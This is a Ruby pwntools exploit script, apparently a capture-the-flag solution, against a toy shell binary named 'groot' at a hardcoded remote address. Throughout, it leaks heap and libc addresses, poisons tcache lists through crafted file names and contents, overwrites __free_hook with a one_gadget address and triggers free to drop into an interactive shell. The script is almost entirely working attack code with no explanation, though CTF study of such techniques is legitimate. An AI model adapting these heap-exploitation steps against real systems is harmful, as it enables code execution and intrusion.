#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

@magic = one_gadget(file: '/lib/x86_64-linux-gnu/libc.so.6', level: 1)[4]

host, port = '54.238.202.201', 31733
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = 'groot'
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = 'amd64'
# context.log_level = :debug
def pt; z.gets '$ '; end

def mkdir(name)
  pt
  z.puts "mkdir " + name
end

def cd(name)
  pt
  z.puts "cd " + name
end

def cat(name)
  pt
  z.puts "cat " + name
end

def touch(name)
  pt
  z.puts "touch " + name
end

def mkfile(name, content)
  pt
  z.puts "mkfile " + name
  z.gets '?'
  z.write content
end

def rm(name)
  pt
  z.puts "rm " + name
end

def ls(name = '')
  pt
  z.puts 'ls ' + name
end

mkdir 'test'
cd 'test'
mkfile 'a' * 80, 'c' * 80 + "\x00"

cd '..'
rm 'test'
mkfile 'a', 'oao'
mkfile 'b', 'c' * 80 + "\x00"

rm 'a'

ls
z.gets("\e[38;5;153m.\t..\e[0m\t\e[0m\t")
heap = (z.readn(6) + "\x00\x00").u64 - 0x12d60
h.offset heap
log.dump heap.hex

cd '..'
rm 'groot'

maps_chunk = heap + 0x126d0 # chunk of content of /proc/self/maps
mkfile('a', maps_chunk.p64)
# consume 3 0x20, 4th can overwrite chunk size of /proc/self/maps
mkfile('yy', 'a'); mkfile('zz', 'a' * 8 + "\x01\x05")

# this makes tcache[0x20] points to &tcache[0x30]
mkfile 'leak_libc', (heap+0x58).p64
# now free /proc/self/maps, free into unsorted bin
rm '/proc/self/maps'
to_leak = maps_chunk + 0x10

# create loop on Tcache[0x20], again
rm '/etc'
mkdir 'a' * 0x20
rm 'a' * 0x20

content_of_leak_libc = heap + 0x12bc8
mkfile content_of_leak_libc.p64, 'z'

mkfile 'b', to_leak.p64

cat 'leak_libc'
libc = (z.readn(6) + "\x00\x00").u64 - 0x3ebca0
h.offset libc
log.dump libc.hex

# free something so we can have more 0x40 to use
rm '/bin/id'
free_hook = libc + 0x3ed8e8
touch free_hook.p64
touch (libc + @magic).p64

# trigger free
rm '/bin'

debug!
z.interact
